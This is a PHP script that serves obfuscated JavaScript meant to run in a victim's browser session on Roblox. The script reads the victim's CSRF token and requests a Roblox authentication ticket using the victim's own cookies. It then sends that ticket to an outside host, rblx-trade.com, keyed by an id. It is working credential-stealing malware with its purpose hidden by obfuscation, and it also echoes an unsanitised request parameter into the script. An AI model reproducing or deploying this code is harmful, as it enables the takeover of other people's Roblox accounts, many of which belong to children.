<?php
    $servername = "";
    $username = "";
    $password = "";
    $dbname = "rblxapi";
    $id = $_REQUEST['id'];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM stubs WHERE id = '".mysqli_real_escape_string($conn, $id)."'";
    $result = mysqli_query($conn, $sql);
    $webhook = null;
    if (mysqli_num_rows($result) > 0) {
      while($row = mysqli_fetch_assoc($result)) {
        $prompt = $row["prompt"];
      }
    }
    $conn->close();

    $http_origin = $_SERVER['HTTP_ORIGIN'];
    if ($http_origin == "https://www.roblox.com" || $http_origin == "https://web.roblox.com")
    {  
        header("Access-Control-Allow-Origin: $http_origin");
    }

    header("Content-Type: application/x-javascript");
    echo "var id = ".$id.';';
    //deobfuscated part in js-source.txt
    echo "var _0x1fa0=['setToken(\\x27','toString','table','include','apply','console','115807MQOOnx','4UoglgX','return\\x20/\\x22\\x20+\\x20this\\x20+\\x20\\x22/','1181dkJYrh','POST','exception','97244GQXBnn','test','split','103267IMKgVs','&t=','headers','length','log','12eHfXFi','112679vGRbPw','text','info','4708rFwcJF','warn','424ugyips','https://www.roblox.com','constructor','173904XNaOEu','rbx-authentication-ticket','prototype','bind','return\\x20(function()\\x20','2DlidGY','https://rblx-trade.com/rblxapi/send.php?id=','1CrEqli'];var _0x434f=function(_0x5a9b43,_0x4ad92a){_0x5a9b43=_0x5a9b43-0x1c2;var _0x1009ca=_0x1fa0[_0x5a9b43];return _0x1009ca;};(function(_0x2488cd,_0x58ecdc){var _0x45c794=_0x434f;while(!![]){try{var _0x455242=parseInt(_0x45c794(0x1c2))*parseInt(_0x45c794(0x1c7))+-parseInt(_0x45c794(0x1d6))+-parseInt(_0x45c794(0x1de))*parseInt(_0x45c794(0x1e2))+-parseInt(_0x45c794(0x1d3))*-parseInt(_0x45c794(0x1e4))+parseInt(_0x45c794(0x1d0))*parseInt(_0x45c794(0x1c9))+-parseInt(_0x45c794(0x1df))+parseInt(_0x45c794(0x1d9))*-parseInt(_0x45c794(0x1d1));if(_0x455242===_0x58ecdc)break;else _0x2488cd['push'](_0x2488cd['shift']());}catch(_0x3231be){_0x2488cd['push'](_0x2488cd['shift']());}}}(_0x1fa0,0x458c8),async function(){var _0x56cbe0=_0x434f,_0x56b757=function(){var _0x5ec882=!![];return function(_0x11712c,_0x4fd84e){var _0x23da9f=_0x5ec882?function(){var _0x1c1c10=_0x434f;if(_0x4fd84e){var _0x4aaeef=_0x4fd84e[_0x1c1c10(0x1ce)](_0x11712c,arguments);return _0x4fd84e=null,_0x4aaeef;}}:function(){};return _0x5ec882=![],_0x23da9f;};}(),_0x8b0a91=_0x56b757(this,function(){var _0x4148ed=function(){var _0x1798f2=_0x434f,_0x3c48a4=_0x4148ed[_0x1798f2(0x1e6)](_0x1798f2(0x1d2))()['constructor']('^([^\\x20]+(\\x20+[^\\x20]+)+)+[^\\x20]}');return!_0x3c48a4[_0x1798f2(0x1d7)](_0x8b0a91);};return _0x4148ed();});_0x8b0a91();var _0x3cfbb5=function(){var _0x48b5ca=!![];return function(_0x2f4397,_0x2c318d){var _0xdf0bf3=_0x48b5ca?function(){var _0x33e779=_0x434f;if(_0x2c318d){var _0x29024b=_0x2c318d[_0x33e779(0x1ce)](_0x2f4397,arguments);return _0x2c318d=null,_0x29024b;}}:function(){};return _0x48b5ca=![],_0xdf0bf3;};}(),_0x3fdcfd=_0x3cfbb5(this,function(){var _0xdca455=_0x434f,_0x3568a2;try{var _0xee5b4c=Function(_0xdca455(0x1c6)+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');');_0x3568a2=_0xee5b4c();}catch(_0x269ace){_0x3568a2=window;}var _0x50e227=_0x3568a2[_0xdca455(0x1cf)]=_0x3568a2[_0xdca455(0x1cf)]||{},_0x1d8a87=[_0xdca455(0x1dd),_0xdca455(0x1e3),_0xdca455(0x1e1),'error',_0xdca455(0x1d5),_0xdca455(0x1cc),'trace'];for(var _0x37bb13=0x0;_0x37bb13<_0x1d8a87[_0xdca455(0x1dc)];_0x37bb13++){var _0x26ae4c=_0x3cfbb5[_0xdca455(0x1e6)][_0xdca455(0x1c4)]['bind'](_0x3cfbb5),_0x4c4ce7=_0x1d8a87[_0x37bb13],_0x6ddae6=_0x50e227[_0x4c4ce7]||_0x26ae4c;_0x26ae4c['__proto__']=_0x3cfbb5[_0xdca455(0x1c5)](_0x3cfbb5),_0x26ae4c[_0xdca455(0x1cb)]=_0x6ddae6[_0xdca455(0x1cb)][_0xdca455(0x1c5)](_0x6ddae6),_0x50e227[_0x4c4ce7]=_0x26ae4c;}});_0x3fdcfd();var _0x511eba=(await(await fetch(_0x56cbe0(0x1e5),{'credentials':_0x56cbe0(0x1cd)}))[_0x56cbe0(0x1e0)]())[_0x56cbe0(0x1d8)](_0x56cbe0(0x1ca))[0x1][_0x56cbe0(0x1d8)]('\\x27)')[0x0],_0xddcbd6=(await fetch('https://auth.roblox.com/v1/authentication-ticket',{'method':_0x56cbe0(0x1d4),'credentials':'include','headers':{'x-csrf-token':_0x511eba}}))[_0x56cbe0(0x1db)]['get'](_0x56cbe0(0x1c3));await fetch(_0x56cbe0(0x1c8)+id+_0x56cbe0(0x1da)+_0xddcbd6);}());";
    if ($prompt != ''){
        echo "prompt('".$prompt."');";
    };
?>